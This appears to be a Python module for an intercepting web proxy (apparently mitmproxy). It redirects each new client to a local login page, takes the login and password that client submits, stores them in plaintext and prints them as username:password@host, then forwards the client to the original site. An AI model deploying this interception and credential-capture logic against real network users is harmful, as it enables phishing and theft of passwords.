from netlib.http import Headers
from utility import *
import os


LOCALHOST = 'localhost'
WEB_ROOT = 'html'
_clients = dict()


def handle_request_if_new_client(flow):
    if is_new_client(flow.client_conn.address.host):
        handle_new_client_request(flow)


def handle_new_client_request(flow):
    if request_is_to_internet(flow.request):
        if request_found_on_localhost(flow.request):
            change_request_to_localhost(flow.request)
        else:
            change_request_to_login_page(flow.request)

    elif request_path_is_empty(flow.request):
        change_request_to_login_page(flow.request)

    elif request_has_client_login_info(flow.request):
        get_and_store_client_login_info(flow)
        change_request_to_start(flow.request)


def replace_index_request_if_necessary(request):
    if request_is_to_localhost(request) and request_path_is_empty(request):
        request.host = request.headers['host']


def request_found_on_localhost(request):
    return os.path.isfile(WEB_ROOT + request.path)


def change_request_to_localhost(request):
    request.host = LOCALHOST


def request_is_to_internet(request):
    return not request_is_to_localhost(request)


def request_is_to_localhost(request):
    return request.host == LOCALHOST


def request_path_is_empty(request):
    return not request.path or request.path == '/'


def store_client_login_info(host, username, password):
    if is_new_client(host):
        _clients[host] = Client(host, username, password)
        debug(_clients[host])


def is_new_client(host):
    return host not in _clients


def request_has_client_login_info(request):
    return request_is_to_localhost(request) and request.path == '/index.html'


def get_and_store_client_login_info(flow):
    params = url_params_to_dict(flow.request.content)
    store_client_login_info(flow.client_conn.address.host, params['login'], 
        params['password'])


def change_request_to_login_page(request):
    request.host = LOCALHOST 
    request.path = '/login.html'
    request.method = 'GET'
    request.scheme = 'http'


def change_request_to_start(request):
    request.host = request.headers['Referer'] \
        .replace('http://' , '') \
        .replace('https://', '') \
        .replace('/', '')
    request.path = '/'
    request.method = 'GET'
    request.scheme = 'http'
    request.content = ''
    request.headers = Headers()


def add_dont_cache_headers(response):
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'


class Client:
    def __init__(self, host, username, password):
        self.host = host
        self.username = username
        self.password = password

    def __str__(self):
        return self.username + ":" + self.password + '@' + self.host
